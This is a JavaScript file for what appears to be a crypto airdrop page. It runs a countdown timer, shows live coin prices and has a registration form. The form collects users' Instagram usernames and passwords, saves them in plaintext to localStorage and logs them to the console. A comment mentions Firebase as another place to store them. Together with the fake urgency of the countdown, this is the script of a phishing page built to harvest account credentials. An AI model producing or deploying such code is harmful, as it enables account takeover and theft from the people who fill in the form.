// Countdown Timer
function startCountdown(durationInMinutes) {
    let countdown = durationInMinutes * 60; // Convert to seconds
    const countdownElement = document.getElementById("countdown");

    function updateCountdown() {
        let minutes = Math.floor(countdown / 60);
        let seconds = countdown % 60;

        countdownElement.innerHTML = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        if (countdown > 0) {
            countdown--;
            setTimeout(updateCountdown, 1000);
        } else {
            countdownElement.innerHTML = "Airdrop Ended!";
        }
    }

    updateCountdown();
}
startCountdown(60); // Set countdown for 60 minutes

// Fetch Live Crypto Prices
async function fetchCryptoPrices() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=usd');
        const data = await response.json();

        document.getElementById("btc-price").innerText = `$${data.bitcoin.usd}`;
        document.getElementById("eth-price").innerText = `$${data.ethereum.usd}`;
        document.getElementById("sol-price").innerText = `$${data.solana.usd}`;
    } catch (error) {
        console.error("Error fetching prices:", error);
    }
}

// Fetch prices every 30 seconds
fetchCryptoPrices();
setInterval(fetchCryptoPrices, 30000);

// Form Submission (Firebase or Local Storage)
document.getElementById('registrationForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const instaUsername = document.getElementById('instaUsername').value;
    const instaPassword = document.getElementById('instaPassword').value;

    // Save to Local Storage (if Firebase is not used)
    let storedData = JSON.parse(localStorage.getItem("userData")) || [];
    storedData.push({ username: instaUsername, password: instaPassword, timestamp: new Date() });
    localStorage.setItem("userData", JSON.stringify(storedData));

    // Show Success Message
    document.getElementById('successMessage').style.display = 'block';

    console.log("User Data Saved:", storedData);
});
